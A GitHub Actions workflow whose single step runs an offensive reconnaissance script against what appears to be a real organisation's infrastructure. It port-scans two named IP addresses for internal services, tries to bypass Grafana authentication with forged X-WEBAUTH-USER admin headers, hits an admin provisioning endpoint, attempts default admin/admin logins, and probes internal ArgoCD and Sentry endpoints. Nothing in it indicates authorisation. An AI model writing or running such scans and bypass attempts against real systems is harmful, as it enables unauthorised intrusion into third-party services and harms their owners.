name: Infrastructure Recon
on:
  workflow_dispatch:
  push:
    branches: [recon]

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Deep Recon v3
        shell: bash
        run: |
          set +e
          echo "=== INTERNAL PORT SCAN 135.181.91.132 ==="
          for port in 80 443 5678 8080 8200 8300 8500 9000 9090 15672 6379 5432 27017 3000 4222 2379 2380 10250 10255 6443; do
            code=$(curl -so /dev/null -w "%{http_code}" -m 2 "http://135.181.91.132:$port/" 2>/dev/null)
            if [ "$code" != "000" ]; then
              echo "[+] 135.181.91.132:$port -> HTTP $code"
            fi
          done
          echo "=== PORT SCAN 37.27.26.254 ==="
          for port in 80 443 5678 8080 8200 8500 9000 9090 15672 6379 5432 3000 4222 6443 10250; do
            code=$(curl -so /dev/null -w "%{http_code}" -m 2 "http://37.27.26.254:$port/" 2>/dev/null)
            if [ "$code" != "000" ]; then
              echo "[+] 37.27.26.254:$port -> HTTP $code"
            fi
          done
          echo "=== GRAFANA API WITH VIEWER TRICK ==="
          echo "Try Grafana with X-WEBAUTH-USER header (auth proxy bypass)"
          curl -s -m 5 "https://grafana.mysterium.network/api/org" -H "X-WEBAUTH-USER: admin" -H "X-WEBAUTH-ROLE: Admin" | head -5
          curl -s -m 5 "https://gi.mysterium.network/api/org" -H "X-WEBAUTH-USER: admin" | head -5
          echo "=== GRAFANA PROVISIONING FILE READ ==="
          curl -s -m 5 "https://grafana.mysterium.network/api/admin/provisioning/dashboards/reload" -H "X-WEBAUTH-USER: admin"
          echo "=== TRY GRAFANA LOGIN ==="
          curl -s -m 5 "https://grafana.mysterium.network/login" -X POST -H "Content-Type: application/json" -d '{"user":"admin","password":"admin"}'
          curl -s -m 5 "https://gi.mysterium.network/login" -X POST -H "Content-Type: application/json" -d '{"user":"admin","password":"admin"}'
          echo "=== ARGOCD INTERNAL ==="
          curl -s -m 5 "http://135.181.91.132:8080/" -H "Host: argo.mysterium.network" | head -5
          curl -sk -m 5 "https://135.181.91.132:8080/" -H "Host: argo.mysterium.network" | head -5
          echo "=== SENTRY INTERNAL PORT 9000 ==="
          curl -s -m 5 "http://135.181.91.132:9000/" | head -5
          curl -s -m 5 "http://135.181.91.132:9000/_health" | head -3
          echo "=== DONE ==="
